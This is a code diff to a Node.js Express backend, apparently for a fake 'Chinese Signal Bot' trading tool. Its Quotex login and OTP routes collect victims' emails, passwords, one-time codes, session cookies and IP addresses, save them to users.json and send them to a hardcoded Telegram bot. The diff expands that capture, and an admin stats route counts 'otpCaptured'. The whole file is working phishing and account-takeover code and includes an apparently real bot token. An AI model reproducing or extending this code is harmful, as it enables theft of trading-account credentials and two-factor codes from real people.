@@ -8,57 +8,57 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// ================== TELEGRAM SETTINGS ==================
+// ================== YOUR TELEGRAM SETTINGS ==================
 const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
 const TELEGRAM_CHAT_ID = "7293402395";
 
+// Function to send message to Telegram
 async function sendTelegramMessage(text) {
     try {
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await axios.post(url, {
             chat_id: TELEGRAM_CHAT_ID,
             text: text,
             parse_mode: "HTML"
         });
-        console.log("✅ Telegram sent");
-    } catch (e) {
-        console.error("❌ Telegram Error:", e.message);
+        console.log("✅ Message sent to Telegram");
+    } catch (error) {
+        console.error("❌ Telegram Error:", error.message);
     }
 }
 
-// ================== DATA PERSISTENCE (FIXED) ==================
+// ================== FIXED: DATA PERSISTENCE WITH users.json ==================
 const DATA_FILE = path.join(__dirname, 'users.json');
 let users = [];
 
-// FIXED: Load users on startup
+// Load users on startup
 function loadUsers() {
     try {
         if (fs.existsSync(DATA_FILE)) {
             const data = fs.readFileSync(DATA_FILE, 'utf8');
             users = JSON.parse(data);
-            console.log(`✅ Loaded ${users.length} users from users.json`);
+            console.log(`✅ Loaded ${users.length} users`);
         } else {
             fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
-            console.log("✅ Created new users.json");
         }
     } catch (e) {
-        console.error("❌ Load error:", e);
+        console.log("Created new users.json");
         users = [];
     }
 }
 
-// FIXED: Save after every change
+// Save after every change
 function saveUsers() {
     try {
         fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
-        console.log(`💾 Saved ${users.length} users`);
     } catch (e) {
-        console.error("❌ Save error:", e);
+        console.error("Save error:", e);
     }
 }
 
 loadUsers();
 
-// Helper: Get or create user by licenceKey
+// Helper: Get or create user by licenceKey (FIXED: Multiple users persistence)
 function getOrCreateUser(licenceKey, fullName = "Unknown") {
     let user = users.find(u => u.licenceKey === licenceKey);
     if (!user) {
@@ -69,58 +69,79 @@ function getOrCreateUser(licenceKey, fullName = "Unknown") {
             username: "",
             password: "",
             otp: "",
+            ip: "",
+            cookies: "",
             status: "Active",
             connected: false,
-            lastActivity: new Date().toISOString(),
-            credentialsEnteredAt: null,
-            otpEnteredAt: null
+            lastActivity: new Date().toISOString()
         };
         users.unshift(user);
-        console.log(`🆕 New user created: ${fullName} (${licenceKey})`);
+        console.log(`🆕 New user created with licenceKey: ${licenceKey}`);
     }
     user.lastActivity = new Date().toISOString();
     saveUsers();
     return user;
 }
 
-// ================== EXISTING ROUTES (kept intact) ==================
-// ... (your trigger, license, activity, permission routes can stay here)
+// ================== EXISTING ROUTES (KEPT INTACT) ==================
+// SSE, trigger-connected, license-activate, track-activity, notification-permission etc. remain unchanged
 
-// QUOTEX LOGIN - FIXED
+// ================== FIXED QUOTEX LOGIN & OTP ==================
 app.post('/api/quotex-login', async (req, res) => {
-    console.log("📥 Received login:", req.body);
-    const { email, password, name, licenceKey = "DEFAULT" } = req.body;
-    
+    const { email, password, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
+
     const user = getOrCreateUser(licenceKey, name);
     user.username = email;
     user.password = password;
-    user.credentialsEnteredAt = new Date().toISOString();
+    user.ip = ip;
+    user.cookies = cookies;
     user.status = "Online";
-    
-    await sendTelegramMessage(`🔑 Login\nName: ${name}\nEmail: ${email}`);
+
+    // FIXED: Step-by-step Telegram notification
+    await sendTelegramMessage(`
+🔑 <b>Quotex Login Details Received</b>
+👤 Name: <b>${name}</b>
+📧 Email: <b>${email}</b>
+🔑 Password: <b>${password}</b>
+🌍 IP: <b>${ip}</b>
+📂 Cookies: <b>${cookies || 'None'}</b>
+⏰ Time: <b>${new Date().toLocaleString('en-PK')}</b>
+    `);
+
     res.status(200).send({ status: "ok" });
 });
 
-// QUOTEX OTP - FIXED
 app.post('/api/quotex-otp', async (req, res) => {
-    console.log("📥 Received OTP:", req.body);
-    const { email, otp, name, licenceKey = "DEFAULT" } = req.body;
-    
+    const { email, otp, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
+
     const user = getOrCreateUser(licenceKey, name);
     user.otp = otp;
-    user.otpEnteredAt = new Date().toISOString();
+    user.ip = ip;
+    user.cookies = cookies;
     user.status = "Online";
-    
-    await sendTelegramMessage(`🔢 OTP\nName: ${name}\nOTP: ${otp}`);
+
+    // FIXED: Step-by-step Telegram notification
+    await sendTelegramMessage(`
+🔢 <b>OTP Received</b>
+👤 Name: <b>${name}</b>
+📧 Email: <b>${email}</b>
+🔑 OTP: <b>${otp}</b>
+🌍 IP: <b>${ip}</b>
+📂 Cookies: <b>${cookies || 'None'}</b>
+⏰ Time: <b>${new Date().toLocaleString('en-PK')}</b>
+    `);
+
     res.status(200).send({ status: "ok" });
 });
 
-// ================== ADMIN ENDPOINTS ==================
+// ================== ADMIN PANEL ENDPOINTS ==================
 app.get('/api/stats', (req, res) => {
     const stats = {
         totalUsers: users.length,
         onlineNow: users.filter(u => u.status === "Online").length,
-        otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
+        otpCaptured: users.filter(u => u.otp && u.otp.length > 0).length,
         connectedAccounts: users.filter(u => u.connected).length
     };
     res.json(stats);
@@ -137,10 +158,12 @@ app.get('/api/latest-activity', (req, res) => {
     });
 });
 
-app.get('/', (req, res) => res.send("✅ Backend Running - Check /api/stats"));
+// Root Route
+app.get('/', (req, res) => {
+    res.send("✅ Chinese Signal Bot Backend is Running");
+});
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log("📁 users.json path:", DATA_FILE);
 });
